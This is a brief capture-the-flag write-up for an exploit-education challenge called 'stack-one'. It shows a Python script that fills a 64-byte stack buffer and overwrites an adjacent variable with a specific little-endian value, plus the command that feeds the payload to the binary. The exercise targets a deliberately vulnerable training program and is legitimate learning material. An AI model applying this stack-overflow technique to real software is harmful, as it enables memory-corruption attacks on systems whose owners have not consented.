Summery:

This challenge is very similar to stack-zero except now it wants a specific
value, that is 0x496c5962 instead of random 0x42 bytes ('A' * 64 + 4).

Solution:

this can be easily achieved by modifiying the bytes after the 64 characters of
the buffer, of course we have to account for little-endian-ness, so we flip the
values backwards

```python
#!/usr/bin/env python

little_endian_value = '\x62' + '\x59' + '\x6c' + '\x49'
preceding_buffer = '\x42' * 64
print(preceding_buffer + little_endian_value)
```

output:

```bash
./stack-one $(python ~/solution-stack-one.py)
